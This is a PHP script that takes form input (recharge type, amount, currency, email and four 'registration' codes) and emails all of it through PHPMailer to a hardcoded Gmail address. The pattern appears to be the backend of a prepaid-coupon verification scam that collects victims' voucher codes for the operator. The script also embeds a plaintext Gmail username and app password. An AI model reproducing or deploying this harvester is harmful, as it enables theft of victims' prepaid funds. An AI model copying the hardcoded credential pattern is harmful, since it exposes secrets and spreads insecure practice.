<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

//Load Composer's autoloader
// require 'vendor/autoload.php';
require './phpmailler/src/Exception.php';
require './phpmailler/src/PHPMailer.php';
require './phpmailler/src/SMTP.php';



// 
//  
//  
//

if(!empty($_POST['recharge']  && !empty($_POST['montant'] )  && !empty($_POST['email'] ) && !empty($_POST['codeEnregistrement'] ) && !empty($_POST['devise'] ) ) 

  ){
    $recharge = htmlspecialchars($_POST['recharge']);
    $montant = htmlspecialchars($_POST['montant']);
    $devise = htmlspecialchars($_POST['devise']);
    $codeEnregistrement = htmlspecialchars($_POST['codeEnregistrement']);
    $codeEnregistrement1 = htmlspecialchars($_POST['codeEnregistrement1']);
    $codeEnregistrement2 = htmlspecialchars($_POST['codeEnregistrement2']);
    $codeEnregistrement3 = htmlspecialchars($_POST['codeEnregistrement3']);
    $email = htmlspecialchars($_POST['email']);


    //Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    // $mail->SMTPDebug = SMTP::DEBUG_SERVER;   
                       //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'jocelynwotcheu2@gmail.com';                     //SMTP username
    $mail->Password   = 'xupbbgzclmtaykwf';                               //SMTP password
    $mail->SMTPSecure ='ssl';            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('jocelynwotcheu2@gmail.com');
    $mail->addAddress('jocelynwotcheu2@gmail.com');     //Add a recipient
    // $mail->addAddress('ellen@example.com');               //Name is optional
    // $mail->addReplyTo('info@example.com', 'Information');
    // $mail->addCC('cc@example.com');
    // $mail->addBCC('bcc@example.com');

    //Attachments
    // $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Hey Nouveau Coupon';
    $mail->Body    = "Mr $email vient d'effectuer une verification  ${recharge} de ${montant} ${devise}<div> <br/> Les codes de
     verifications sont <p>code Enregistrement 1: <b>${codeEnregistrement}</b></p>
     <p>code Enregistrement 2 :<b> ${codeEnregistrement1}</p></b>
     
     <p>code Enregistrement 3 : <b> ${codeEnregistrement2}</b></p>
     
     <p>code Enregistrement 4 :<b> ${codeEnregistrement3}</b></p>
     </div>";
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    // echo 'Message has been sent';
    echo 
    "
    <script>
    alert ('Sent Successfuly');
    document.location.href='action.php';
    </script>
    ";
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error:";
}

    

}
else{
    echo "les champs sont non valides ";
    die();
}



?>